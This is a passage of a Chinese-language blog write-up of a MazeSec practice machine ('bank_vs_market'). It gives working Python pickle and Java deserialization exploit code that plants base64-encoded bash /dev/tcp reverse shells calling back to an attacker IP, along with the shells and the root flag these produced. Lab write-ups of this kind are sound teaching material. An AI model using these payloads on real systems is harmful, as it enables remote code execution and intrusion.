+<p><img src="/2026/01/13/mazesec%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-bank-vs-market/vmware_szxmPYWN62.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到我们现在已经有几十个亿（大概）的存款了，拿提款凭证去8000端口的市场买东西去。</p>
+<p><img src="/2026/01/13/mazesec%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-bank-vs-market/vmware_6zLuWVLzUG.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2026/01/13/mazesec%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-bank-vs-market/vmware_lyYlWWmbLA.png" srcset="/img/loading.gif" lazyload></p>
+<p>不过提示我们要先绑定银行账户。</p>
+<p><img src="/2026/01/13/mazesec%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-bank-vs-market/vmware_feBfdaGmbP.png" srcset="/img/loading.gif" lazyload></p>
+<p>之后成功购买，发现给的是一个网页。</p>
+<p><img src="/2026/01/13/mazesec%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-bank-vs-market/vmware_IKFBebH6YG.png" srcset="/img/loading.gif" lazyload></p>
+<p>之后进入这个网页（注意是80端口的这个页面，不是8000端口）发现一组凭证。</p>
+<h3 id="BANKER"><a href="#BANKER" class="headerlink" title="BANKER"></a>BANKER</h3><hr>
+<p><img src="/2026/01/13/mazesec%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-bank-vs-market/vmware_42rIxbUKWw.png" srcset="/img/loading.gif" lazyload></p>
+<p>这组凭证是市场系统的管理员用户，该用户可以管理后台，查看个人配置等。</p>
+<p>在系统配置界面可以导入和导出配置，选择导出配置提示pickle，那么打pickle反序列化漏洞</p>
+<p>在 Python 的 <code>pickle</code> 模块中，反序列化漏洞的核心在于 <code>__reduce__</code> 魔术方法。当 <code>pickle.load()</code> 试图反序列化一个对象时，如果该对象定义了 <code>__reduce__</code>，pickle 会执行该方法。该方法返回一个元组 <code>(callable, args)</code>，pickle 会自动调用 <code>callable(*args)</code>。</p>
+<p>我们可以利用这一点，将 <code>callable</code> 设置为 <code>os.system</code>，将 <code>args</code> 设置为你的反弹 Shell 命令。</p>
+<p><img src="/2026/01/13/mazesec%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-bank-vs-market/vmware_P9zVWOwvtR.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">GenPayload</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 你提供的命令</span><br>        <span class="hljs-comment"># 这条命令解码后是: (bash &gt;&amp; /dev/tcp/192.168.56.104/4444 0&gt;&amp;1) &amp;</span><br>        command = <span class="hljs-string">&quot;printf KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC41Ni4xMDQvNDQ0NCAwPiYxKSAm|base64 -d|bash&quot;</span><br>        <br>        <span class="hljs-comment"># 返回 (可调用对象, 参数元组)</span><br>        <span class="hljs-comment"># 当 pickle.load 加载时，会执行 os.system(command)</span><br>        <span class="hljs-keyword">return</span> (os.system, (command,))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate</span>():<br>    <span class="hljs-comment"># 1. 实例化对象</span><br>    obj = GenPayload()<br>    <br>    <span class="hljs-comment"># 2. 序列化 (Dump)</span><br>    payload_bytes = pickle.dumps(obj)<br>    <br>    <span class="hljs-comment"># 3. 打印结果</span><br>    <span class="hljs-comment"># CTF 题目通常需要 Base64 编码后的 Pickle 数据</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Base64 Encoded Payload:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(base64.b64encode(payload_bytes).decode())<br>    <br>    <span class="hljs-comment"># 也可以打印原始字节流用于调试</span><br>    <span class="hljs-comment"># print(&quot;\n[+] Raw Bytes:&quot;)</span><br>    <span class="hljs-comment"># print(payload_bytes)</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    generate()<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌──(root㉿kaada)-<span class="hljs-selector-attr">[/home/kali/Desktop]</span><br>└─# python exp<span class="hljs-selector-class">.py</span> <br><span class="hljs-selector-attr">[+]</span> Base64 Encoded Payload:<br>gASVbQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFJwcmludGYgS0dKaGMyZ2dQaVlnTDJSbGRpOTBZM0F2TVRreUxqRTJPQzQxTmk0eE1EUXZORFEwTkNBd1BpWXhLU0FtfGJhc2U2NCAtZHxiYXNolIWUUpQu<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css">────────────────────────────────────────────────────────────────────────────────<br>➤  🏠 <span class="hljs-selector-tag">Main</span> <span class="hljs-selector-tag">Menu</span> (m) 💀 Payloads (<span class="hljs-selector-tag">p</span>) 🔄 <span class="hljs-attribute">Clear</span> (Ctrl-L) 🚫 Quit (<span class="hljs-selector-tag">q</span>/Ctrl-C)<br><span class="hljs-selector-attr">[+]</span> Got reverse shell <span class="hljs-selector-tag">from</span> bank-server-<span class="hljs-number">192.168</span>.<span class="hljs-number">56.215</span>-Linux-x86_64 😍 Assigned SessionID &lt;<span class="hljs-number">1</span>&gt;<br><span class="hljs-selector-attr">[+]</span> Attempting <span class="hljs-selector-tag">to</span> upgrade shell <span class="hljs-selector-tag">to</span> PTY...<br><span class="hljs-selector-attr">[+]</span> Shell upgraded successfully using /usr/bin/python3! 💪<br><span class="hljs-selector-attr">[+]</span> Interacting with session <span class="hljs-selector-attr">[1]</span>, Shell Type: PTY, Menu key: F12 <br>[+] Logging to /root/.penelope/bank-server~<span class="hljs-number">192.168</span>.<span class="hljs-number">56.215</span>_Linux_x86_64/<span class="hljs-number">2026</span>_01_13-<span class="hljs-number">02</span>_18_18-<span class="hljs-number">126</span>.log 📜<br>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<br>banker@bank-server:/opt/market$ <br><br></code></pre></td></tr></table></figure>
+
+<h3 id="ROOT"><a href="#ROOT" class="headerlink" title="ROOT"></a>ROOT</h3><hr>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">banker<span class="hljs-variable">@bank</span>-<span class="hljs-symbol">server:</span>/opt/market<span class="hljs-variable">$ </span>sudo -l<br><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> banker on bank-<span class="hljs-symbol">server:</span><br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span><br><br><span class="hljs-title class_">User</span> banker may run the following commands on bank-<span class="hljs-symbol">server:</span><br>    (<span class="hljs-title class_">ALL</span>) <span class="hljs-symbol">NOPASSWD:</span> /usr/bin/bank-admin-tool<br>banker<span class="hljs-variable">@bank</span>-<span class="hljs-symbol">server:</span>/opt/market<span class="hljs-variable">$ </span><br></code></pre></td></tr></table></figure>
+
+<p>先传个公钥方便登录。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">banker@bank-server:~/.ssh$ <span class="hljs-built_in">cd</span> /opt<br>banker@bank-server:/opt$ <span class="hljs-built_in">ls</span><br>bank-admin-tool-1.0.0.jar  bank-server  market<br>banker@bank-server:/opt$ <br></code></pre></td></tr></table></figure>
+
+<p>发现还有一个管理端，照例download下来看一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# <span class="hljs-built_in">mv</span> /root/.penelope/bank-server\~192.168.56.215_Linux_x86_64/downloads/opt/bank-admin-tool-1.0.0.jar bank-admin-tool-1.0.0.jar                                       <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IOException </span>&#123;<br>        in.defaultReadObject(); <span class="hljs-comment">// 1. 读取对象数据</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.initCommand != <span class="hljs-keyword">null</span> &amp;&amp; !<span class="hljs-keyword">this</span>.initCommand.isEmpty()) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">// 2. 危险操作：直接执行命令</span><br>                Runtime.getRuntime().exec(<span class="hljs-keyword">this</span>.initCommand);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里是漏洞点</p>
+<p><strong>原理：</strong> 当 Java 应用程序反序列化一个 <code>AdminConfig</code> 对象时，JVM 会自动调用 <code>readObject</code> 方法。如果攻击者能够构造一个恶意的序列化数据（Payload），将 <code>initCommand</code> 字段设置为恶意的 Shell 命令，那么在反序列化过程中，该命令就会被 <code>Runtime.getRuntime().exec()</code> 执行，从而导致 <strong>远程代码执行 (RCE)</strong>。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p com/bank/admin<br>javac com/bank/admin/Poc.java<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> /usr/bin/bank-admin-tool<br>发现需要管理员账户/密码<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs swift">banker<span class="hljs-meta">@bank</span><span class="hljs-operator">-</span>server:<span class="hljs-operator">~</span>$ cat <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>p\<span class="hljs-meta">@ss_aD3i</span> <br>admin<span class="hljs-operator">/</span>hellojavabadpython<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.bank.admin; <span class="hljs-comment">// 必须保持包名一致</span><br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-comment">// 1. 模拟目标类结构 (必须包含 serialVersionUID 和 initCommand)</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AdminConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; <span class="hljs-comment">// 必须匹配</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">serverHost</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;localhost&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">serverPort</span> <span class="hljs-operator">=</span> <span class="hljs-number">14646</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">timeout</span> <span class="hljs-operator">=</span> <span class="hljs-number">30000</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">autoReconnect</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">private</span> String initCommand;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setInitCommand</span><span class="hljs-params">(String initCommand)</span> &#123;<br>        <span class="hljs-built_in">this</span>.initCommand = initCommand;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Poc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// ================= 配置区域 =================</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">ip</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;192.168.56.104&quot;</span>; <span class="hljs-comment">// 攻击机 IP</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;4444&quot;</span>;         <span class="hljs-comment">// 攻击机监听端口</span><br>        <span class="hljs-comment">// ===========================================</span><br><br>        <span class="hljs-comment">// 2. 构造原始的反弹 Shell 命令</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">rawCommand</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/&quot;</span> + ip + <span class="hljs-string">&quot;/&quot;</span> + port + <span class="hljs-string">&quot; 0&gt;&amp;1&quot;</span>;<br><br>        <span class="hljs-comment">// 3. 进行 Base64 编码</span><br>        <span class="hljs-comment">// 这一步是为了绕过 Runtime.exec() 对重定向符和特殊字符的限制</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">b64Cmd</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(rawCommand.getBytes());<br><br>        <span class="hljs-comment">// 4. 构造最终的 Payload 命令</span><br>        <span class="hljs-comment">// 格式：bash -c &#123;echo,BASE64&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br>        <span class="hljs-comment">// 这种特殊的写法利用了 bash 的大括号扩展，避免了空格被 exec() 错误切割</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">finalCommand</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;bash -c &#123;echo,&quot;</span> + b64Cmd + <span class="hljs-string">&quot;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>;<br><br>        System.out.println(<span class="hljs-string">&quot;生成的恶意命令: &quot;</span> + finalCommand);<br><br>        <span class="hljs-comment">// 5. 创建配置对象并注入命令</span><br>        <span class="hljs-type">AdminConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdminConfig</span>();<br>        config.setInitCommand(finalCommand);<br><br>        <span class="hljs-comment">// 6. 序列化写入文件</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;admin.config&quot;</span>));<br>        oos.writeObject(config);<br>        oos.close();<br><br>        System.out.println(<span class="hljs-string">&quot;成功生成 Payload 文件: admin.config&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs elixir">banker<span class="hljs-variable">@bank</span>-<span class="hljs-symbol">server:</span>~<span class="hljs-variable">$ </span>java com.bank.admin.<span class="hljs-title class_">Poc</span><br>生成的恶意命令: bash -c &#123;echo,<span class="hljs-title class_">YmFzaCAtaSA</span>+<span class="hljs-title class_">JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEwNC85OTk5IDA</span>+<span class="hljs-title class_">JjE</span>=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;<br>成功生成 <span class="hljs-title class_">Payload</span> 文件: admin.config<br>banker<span class="hljs-variable">@bank</span>-<span class="hljs-symbol">server:</span>~<span class="hljs-variable">$ </span>sudo -l<br><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> banker on bank-<span class="hljs-symbol">server:</span><br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span><br><br><span class="hljs-title class_">User</span> banker may run the following commands on bank-<span class="hljs-symbol">server:</span><br>    (<span class="hljs-title class_">ALL</span>) <span class="hljs-symbol">NOPASSWD:</span> /usr/bin/bank-admin-tool<br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">banker@bank-server:~$ sudo /usr/bin/bank-admin-tool</span><br><span class="hljs-section">===========================================</span><br><span class="hljs-section">    Bank Server Administration Tool v1.0</span><br><span class="hljs-section">===========================================</span><br><br>Configuration loaded from admin.config<br>Connecting to localhost:14646...<br>Connected successfully.<br><br>Admin Username: <br>[1]+  Stopped                 sudo /usr/bin/bank-admin-tool<br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs livescript">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─<span class="hljs-comment"># ./penelope.py 9999</span><br>[+] Listening <span class="hljs-keyword">for</span> reverse shells <span class="hljs-literal">on</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">9999</span> →  <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> • <span class="hljs-number">192.168</span>.<span class="hljs-number">21.128</span> • <span class="hljs-number">192.168</span>.<span class="hljs-number">56.104</span> • <span class="hljs-number">172.17</span>.<span class="hljs-number">0.1</span> • <span class="hljs-number">172.18</span>.<span class="hljs-number">0.1</span> • <span class="hljs-number">10.10</span>.<span class="hljs-number">14.70</span> • <span class="hljs-number">10.10</span>.<span class="hljs-number">14.70</span><br>➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)<br>[+] Got reverse shell <span class="hljs-keyword">from</span> bank-server-<span class="hljs-number">192.168</span>.<span class="hljs-number">56.215</span>-Linux-x86_64 😍 Assigned SessionID &lt;<span class="hljs-number">1</span>&gt;<br>[+] Attempting <span class="hljs-keyword">to</span> upgrade shell <span class="hljs-keyword">to</span> PTY...<br>[+] Shell upgraded successfully <span class="hljs-keyword">using</span> /usr/bin/python3! 💪<br>[+] Interacting <span class="hljs-keyword">with</span> session [<span class="hljs-number">1</span>], Shell Type: PTY, Menu key: F12 <br>[+] Logging <span class="hljs-keyword">to</span> <span class="hljs-regexp">/root/</span>.penelope/bank-server~<span class="hljs-number">192.168</span>.<span class="hljs-number">56.215_</span>Linux_x86_64/<span class="hljs-number">2026_01_13</span>-<span class="hljs-number">02_56_02</span>-<span class="hljs-number">923.log</span> 📜<br>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<br>root@bank-server:/home/banker<span class="hljs-comment"># </span><br>root@bank-server:/home/banker<span class="hljs-comment"># cat /root/root.txt</span><br>flag&#123;root-<span class="hljs-number">22ca</span>34af1207f0478173b7a793b591bb47d5437d51377abb597a7f6bec3073da&#125;<br><br><br>非常感谢您的参与 诸事顺遂<br><br><br>                        -<span class="hljs-keyword">by</span> DingTom (MazeSec Team)<br>root@bank-server:/home/banker<span class="hljs-comment"># </span><br><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%A4%8D%E7%9B%98/" class="print-no-link">#复盘</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>mazesec靶机复盘-bank_vs_market</div>
+      <div>http://example.com/2026/01/13/mazesec靶机复盘-bank-vs-market/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Skyarrow</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>January 13, 2026</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/01/12/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84windows%E7%94%9F%E6%B4%BB-Cicada/" title="从零开始的windows生活-Cicada">
+                        <span class="hidden-mobile">从零开始的windows生活-Cicada</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <style>.statistics { display: none !important; }</style>
+<a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+<br>
+<script async src="//cdn.busuanzi.cc/busuanzi/3.6.9/busuanzi.min.js"></script>
+<span id="busuanzi_container_site_pv"> 本站总访问量 <span id="busuanzi_site_pv" style="color:red">...</span> 次 </span> &nbsp; | &nbsp; <span id="busuanzi_container_site_uv"> 总访客数 <span id="busuanzi_site_uv" style="color:red">...</span> 人 </span> 
+    </div>
+  
+  
+  
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
